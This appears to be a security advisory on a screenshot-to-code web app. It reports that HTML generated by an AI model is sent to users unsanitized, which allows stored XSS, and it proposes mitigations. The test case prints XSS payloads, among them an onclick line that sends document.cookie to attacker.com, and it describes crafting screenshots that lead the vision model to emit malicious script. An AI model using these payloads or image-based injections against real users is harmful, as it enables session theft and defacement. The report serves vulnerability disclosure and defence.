- Vulnerability Name: Stored Cross-Site Scripting (XSS) via AI-Generated Code
- Description:
    1. A malicious attacker crafts a screenshot or design. This input is specifically designed to trick the AI model into generating HTML code that includes a Javascript payload. For example, the screenshot could visually represent a button, but the underlying data, when processed by the AI, leads to the generation of `<button onclick="alert('XSS')">Click me</button>` or similar malicious Javascript code embedded within HTML tags or attributes.
    2. The attacker uses the application's frontend to upload this malicious screenshot or design and initiates the code generation process.
    3. The backend of the application, utilizing an AI model (like GPT-4 Vision, Claude, Gemini), processes the uploaded image. Due to the crafted nature of the input, the AI model inadvertently generates HTML code that contains the attacker's malicious Javascript payload.
    4. The backend returns this AI-generated code, including the malicious Javascript, to the frontend. Critically, the backend does not sanitize or validate the generated code to remove or neutralize any potentially harmful scripts.
    5. The application's frontend receives the AI-generated code from the backend. Assuming the frontend renders this code directly into the DOM (Document Object Model) without proper output encoding or sanitization, the malicious Javascript payload is now part of the active web page.
    6. When a user (either the attacker themselves to confirm the exploit or, more likely, another unsuspecting user) views the part of the application where this AI-generated code is rendered, the browser executes the embedded malicious Javascript code.
    7. This execution of malicious Javascript within the user's browser constitutes a Stored Cross-Site Scripting (XSS) vulnerability. The attacker's script runs in the context of the user's session, allowing for various malicious actions.
- Impact:
    - Account compromise: An attacker can potentially steal session cookies or other authentication tokens, gaining unauthorized access to the user's account within the application.
    - Data theft: Malicious scripts can be designed to extract sensitive data accessible within the user's browser, including personal information, application data, or even data from other websites if the browser has cross-site scripting vulnerabilities.
    - Malware distribution: The XSS vulnerability can be used to redirect users to external websites hosting malware or to inject malware directly into the application, potentially infecting users' machines.
    - Website defacement: Attackers could alter the visual appearance or functionality of the web page as seen by other users, damaging the application's reputation and user trust.
    - Session hijacking: By stealing session identifiers, attackers can directly hijack user sessions, performing actions as if they were the legitimate user without needing their credentials.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - Code analysis of the provided files reveals no explicit sanitization or encoding of the AI-generated code in the backend.
    - There is no evidence of any output encoding or escaping being applied to the AI-generated code before rendering in the frontend from the provided backend files.
    - The project does not appear to implement a Content Security Policy (CSP) to restrict the execution of inline scripts or other potentially dangerous behaviors in the browser.
    - Review of `backend\routes\evals.py` and `backend\routes\generate_code.py` confirms that there is no sanitization or encoding applied to the AI-generated HTML code before it is sent to the frontend or used in evaluation routes.
- Missing Mitigations:
    - Backend Sanitization: Implement server-side sanitization of the AI-generated code before it is stored or transmitted to the frontend. This process should identify and neutralize potentially harmful Javascript code and HTML elements. Libraries like DOMPurify could be used on the backend for robust HTML sanitization.
    - Frontend Output Encoding/Escaping: The frontend must implement proper output encoding or escaping of the AI-generated code before rendering it in the browser's DOM. This ensures that any potentially malicious code is treated as plain text and not executed as code. Using appropriate templating engines that provide automatic escaping or manually escaping HTML entities is crucial.
    - Content Security Policy (CSP): Implement a strict Content Security Policy (CSP) to control the resources that the browser is allowed to load and execute. A well-configured CSP can significantly reduce the impact of XSS attacks by preventing the execution of inline Javascript and restricting other dangerous functionalities.
- Preconditions:
    1. Malicious Input Creation: An attacker needs to be able to create a malicious screenshot or design that will successfully manipulate the AI model into generating Javascript code as part of its HTML output. This requires some understanding of how the AI model interprets visual inputs and translates them into code.
    2. Vulnerable Frontend Rendering: The frontend application must be vulnerable to directly rendering the unsanitized AI-generated code, most likely by using methods like `innerHTML` or similar DOM manipulation techniques without proper escaping.
    3. User Access to Vulnerable Content: A user must access the part of the application where the malicious AI-generated code is rendered in order for the XSS payload to be executed in their browser. This could be any user viewing the generated output, not just the attacker.
- Source Code Analysis:
    1. `backend\llm.py`: This file is central to the vulnerability as it contains the core logic for interacting with different Language Models (LLMs) like OpenAI's GPT models, Anthropic's Claude models, and Google's Gemini models. Functions such as `stream_openai_response`, `stream_claude_response`, `stream_gemini_response`, and `stream_claude_response_native` are responsible for sending prompts (derived from user uploads) to the AI models and receiving the generated code as a response. The crucial point is that the `completion` object returned by these functions, specifically the `completion['code']`, which contains the AI-generated HTML, CSS, and Javascript code, is returned as a raw string **without any sanitization**. There are no functions called within these LLM interaction functions or in related utility functions that perform any kind of HTML or Javascript sanitization or validation.
    2. `backend\mock_llm.py`: This file provides mock implementations of the LLM responses, primarily for debugging and testing purposes. The mock code examples within this file, such as `APPLE_MOCK_CODE`, `NYTIMES_MOCK_CODE`, `MORTGAGE_CALCULATOR_VIDEO_PROMPT_MOCK`, and `GOOGLE_FORM_VIDEO_PROMPT_MOCK`, clearly demonstrate that the AI is expected to generate full HTML documents that can include Javascript code within `<script>` tags and event handlers (e.g., `onclick`). This confirms that Javascript generation is an intended and functional part of the AI's output, and if not sanitized, it poses a direct XSS risk.
    3. `backend\codegen\utils.py`: The `extract_html_content` function in this file is designed to extract the HTML content from a larger text response (presumably from the AI). It uses a regular expression `r"(<html.*?>.*?</html>)"` to find and return the content within `<html>` tags. However, this function **does not perform any sanitization**. It simply extracts the HTML string as is. This means any malicious Javascript code present within the AI-generated HTML will be preserved and passed along without modification.
    4. `backend\main.py` and `backend\routes` (routes are in separate files, analyzed below):  `backend\main.py` sets up the FastAPI application and includes routers defined in the `backend\routes` directory. These routes handle the API endpoints that receive user image/video uploads and manage code generation and evaluations.
        - **`backend\routes\generate_code.py`**: The `stream_code` websocket endpoint in this file is the core of the code generation process. It receives user parameters, calls the AI model to generate code, and then uses `extract_html_content` to extract the HTML. Critically, **no sanitization is performed on the AI-generated HTML code before it is sent to the frontend via websocket messages of type `setCode`**. The code is streamed in chunks and then sent as a complete HTML string, all without any sanitization.
        - **`backend\routes\evals.py`**: This file handles evaluation routes. The `get_evals` and `get_pairwise_evals` routes retrieve HTML files from the filesystem and return them as part of the API response.  Specifically, the `output_html` read from these files is sent in the `outputs` field of the `Eval` response model **without any sanitization**. This means if these HTML evaluation files contain malicious Javascript (either maliciously crafted or inadvertently generated/stored), they will be served to the frontend unsanitized, potentially leading to XSS if the frontend renders these evaluation outputs without proper handling.
    5. Frontend Code (not provided): The frontend code is not included in the provided files, which is a critical missing piece. However, based on the project description and the nature of the vulnerability, it is highly likely that the frontend is designed to render the HTML code received from the backend. If the frontend directly inserts this HTML string into the DOM without proper escaping, it will be vulnerable to XSS. Common vulnerable frontend rendering methods include using `innerHTML` or similar DOM manipulation APIs directly with the unsanitized HTML string.

- Security Test Case:
    1. Precondition: Ensure you have the application running locally, as described in the `README.md`, to perform the test safely. Access the frontend at `http://localhost:5173`.
    2. Craft Malicious Screenshot: Create a simple image (e.g., using any image editor or even a basic drawing tool). Within this image, visually represent a button or a similar interactive element.  Embed text within the image that, when interpreted by the AI, is likely to generate an HTML button element with an `onclick` attribute containing Javascript `alert('XSS-Test')`. For instance, the text in the image could be visually styled like a button label, and the surrounding context might suggest interactive behavior. A very basic image with just the text  `<button onclick="alert('XSS-Test')">Click Me</button>` could be sufficient for a simple test.
    3. Upload Malicious Screenshot: In the running application frontend, use the image upload functionality. Upload the crafted malicious screenshot image.
    4. Initiate Code Generation: Select any supported stack (e.g., "HTML + Tailwind"). Click the "Generate Code" button to start the AI code generation process.
    5. Inspect Generated Code (Optional but Recommended): To confirm the vulnerability server-side, use your browser's developer tools (Network tab) to intercept the API response from the backend after code generation is complete. Look for the API endpoint that returns the generated code. Examine the response body. Verify if the generated HTML code indeed contains the malicious Javascript payload, such as `<button onclick="alert('XSS-Test')">Click Me</button>`. This step helps confirm that the backend is generating the malicious code as intended.
    6. Render and Execute XSS Payload (Frontend): After the code generation process completes in the frontend, observe the rendered output in the application's UI. If the frontend is vulnerable, upon loading the generated output, or when interacting with the button element that was supposed to be generated from your malicious screenshot, you should see a Javascript alert box pop up in your browser displaying "XSS-Test".  The exact trigger for the XSS might depend on how the AI interprets your image and generates the code, but the key is to look for Javascript execution within the browser context after the AI-generated content is rendered.
    7. Verify XSS Impact: If the `alert('XSS-Test')` box appears, the Stored XSS vulnerability is confirmed. For a more thorough test and to demonstrate higher impact, you could modify the payload in your crafted screenshot to perform more impactful actions. For example, instead of `alert('XSS-Test')`, you could try:
        - `onclick="document.location='https://attacker.com/cookie-stealer?cookie='+document.cookie"` (to attempt to redirect to an attacker's site with cookie data).
        - `onclick="document.body.innerHTML = '<h1>You have been hacked!</h1>'"` (for basic defacement).

    **Important Note:**  Always perform security testing in a safe, isolated environment (like a local development instance) and **never** against a production system without explicit permission. This test case is designed to demonstrate the vulnerability in a controlled setting.
